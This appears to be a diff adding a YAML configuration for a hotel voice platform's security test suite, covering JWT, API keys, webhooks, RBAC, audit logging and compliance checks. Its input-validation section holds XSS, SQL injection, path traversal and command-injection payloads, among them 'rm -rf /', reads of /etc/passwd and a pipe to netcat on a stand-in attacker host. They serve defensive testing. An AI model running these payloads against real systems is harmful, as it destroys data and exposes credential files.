@@ -1,0 +1,227 @@
+# Security Test Configuration for VoiceHive Hotels
+# Configuration for comprehensive security testing suite
+
+security_testing:
+  # Test execution settings
+  execution:
+    parallel_execution: false
+    timeout_per_test: 300 # 5 minutes
+    retry_failed_tests: 1
+    generate_detailed_report: true
+
+  # JWT Security Test Configuration
+  jwt_testing:
+    test_algorithms: ["RS256", "ES256"]
+    invalid_algorithms: ["none", "HS256"]
+    test_expiration_times: [15, 60, 3600] # minutes
+    test_key_sizes: [2048, 4096]
+
+  # API Key Security Test Configuration
+  api_key_testing:
+    test_key_lengths: [32, 64, 128]
+    test_rotation_intervals: [30, 60, 90] # days
+    test_rate_limits: [60, 1000, 10000] # requests per minute
+
+  # Input Validation Test Configuration
+  input_validation:
+    max_string_length: 10000
+    max_array_length: 1000
+    max_object_depth: 10
+    test_payloads:
+      xss:
+        - "<script>alert('xss')</script>"
+        - "javascript:alert('xss')"
+        - "<img src=x onerror=alert('xss')>"
+        - "<svg onload=alert('xss')>"
+        - "onclick=alert('xss')"
+      sql_injection:
+        - "'; DROP TABLE users; --"
+        - "' UNION SELECT * FROM passwords --"
+        - "' OR '1'='1"
+        - "'; INSERT INTO admin VALUES ('hacker', 'password'); --"
+      path_traversal:
+        - "../../../etc/passwd"
+        - "..\\..\\..\\windows\\system32\\config\\sam"
+        - "....//....//....//etc/passwd"
+      command_injection:
+        - "test; rm -rf /"
+        - "test && cat /etc/passwd"
+        - "test | nc attacker.com 4444"
+        - "$(whoami)"
+        - "`id`"
+
+  # Webhook Security Test Configuration
+  webhook_testing:
+    test_signature_algorithms: ["sha256", "sha1", "md5"]
+    test_timestamp_tolerance: 300 # seconds
+    test_payload_sizes: [1024, 10240, 102400] # bytes
+    test_rate_limits: [10, 100, 1000] # requests per minute
+
+  # Audit Logging Test Configuration
+  audit_logging:
+    required_events:
+      - "auth.login.success"
+      - "auth.login.failure"
+      - "auth.logout"
+      - "authz.access.denied"
+      - "data.read"
+      - "data.create"
+      - "data.update"
+      - "data.delete"
+      - "pii.access"
+      - "security.violation"
+    retention_periods:
+      authentication: 90 # days
+      authorization: 90
+      data_access: 365
+      pii_access: 2555 # 7 years
+      security_violations: 2555
+
+  # RBAC Test Configuration
+  rbac_testing:
+    test_roles:
+      - "guest_user"
+      - "hotel_staff"
+      - "hotel_admin"
+      - "system_admin"
+    test_permissions:
+      - "call_view"
+      - "call_start"
+      - "call_end"
+      - "hotel_view"
+      - "hotel_manage"
+      - "system_admin"
+    test_resources:
+      - "/calls"
+      - "/hotels"
+      - "/admin"
+      - "/auth"
+
+  # Penetration Testing Configuration
+  penetration_testing:
+    jwt_attacks:
+      - "algorithm_confusion"
+      - "none_algorithm"
+      - "key_confusion"
+      - "timestamp_manipulation"
+      - "replay_attack"
+    input_attacks:
+      - "unicode_normalization"
+      - "encoding_bypass"
+      - "polyglot_injection"
+      - "nested_object_bomb"
+      - "large_array_dos"
+      - "regex_dos"
+    webhook_attacks:
+      - "timing_attack"
+      - "replay_attack"
+      - "hash_length_extension"
+      - "collision_attack"
+
+  # Compliance Testing Configuration
+  compliance_testing:
+    gdpr:
+      test_data_subject_rights: true
+      test_lawful_basis_tracking: true
+      test_consent_management: true
+      test_data_retention: true
+      test_pii_redaction: true
+      test_breach_notification: true
+    pci_dss:
+      test_encryption: true
+      test_access_control: true
+      test_network_security: true
+      test_vulnerability_management: true
+    sox:
+      test_segregation_of_duties: true
+      test_change_management: true
+      test_audit_trails: true
+    iso27001:
+      test_security_policy: true
+      test_risk_management: true
+      test_incident_management: true
+
+  # Security Metrics Configuration
+  metrics:
+    required_metrics:
+      - "authentication_failures_total"
+      - "authorization_failures_total"
+      - "security_violations_total"
+      - "rate_limit_exceeded_total"
+      - "jwt_validation_failures_total"
+      - "input_validation_failures_total"
+      - "webhook_verification_failures_total"
+    alert_thresholds:
+      authentication_failures: 10
+      security_violations: 1
+      rate_limit_exceeded: 100
+
+  # Test Data Configuration
+  test_data:
+    users:
+      - id: "test-user-1"
+        email: "user1@example.com"
+        roles: ["guest_user"]
+        permissions: ["call_view"]
+      - id: "test-admin-1"
+        email: "admin1@example.com"
+        roles: ["system_admin"]
+        permissions: ["system_admin", "call_start", "hotel_manage"]
+    hotels:
+      - id: "hotel-1"
+        name: "Test Hotel 1"
+      - id: "hotel-2"
+        name: "Test Hotel 2"
+    api_keys:
+      - id: "test-api-key-1"
+        service: "test-service"
+        permissions: ["call_start"]
+        rate_limits:
+          requests_per_minute: 100
+
+  # Security Documentation Requirements
+  documentation:
+    required_files:
+      - "SECURITY_HARDENING_SUMMARY.md"
+      - "AUTH_README.md"
+      - "MONITORING_PRODUCTION_GUIDE.md"
+      - "RESILIENCE_IMPLEMENTATION.md"
+    required_sections:
+      - "Authentication"
+      - "Authorization"
+      - "Input Validation"
+      - "Audit Logging"
+      - "Incident Response"
+
+  # Test Environment Configuration
+  environment:
+    redis_url: "redis://localhost:6379"
+    vault_url: "http://localhost:8200"
+    test_database_url: "postgresql://test:test@localhost:5432/test"
+    log_level: "DEBUG"
+    enable_pii_redaction: true
+
+  # Reporting Configuration
+  reporting:
+    formats: ["json", "html", "junit"]
+    include_coverage: true
+    include_recommendations: true
+    include_compliance_status: true
+    output_directory: "security_test_reports"
+
+# Test execution order (dependencies)
+test_execution_order:
+  1: "JWT Token Security Tests"
+  2: "API Key Security Tests"
+  3: "Input Validation Security Tests"
+  4: "Webhook Security Tests"
+  5: "Audit Logging Tests"
+  6: "RBAC Permission Tests"
+  7: "Advanced JWT Attack Tests"
+  8: "Advanced Input Validation Tests"
+  9: "Advanced Webhook Attack Tests"
+  10: "Security Bypass Tests"
+  11: "GDPR Compliance Tests"
+  12: "Security Documentation Tests"
+  13: "Security Configuration Tests"
+  14: "Regulatory Compliance Tests"
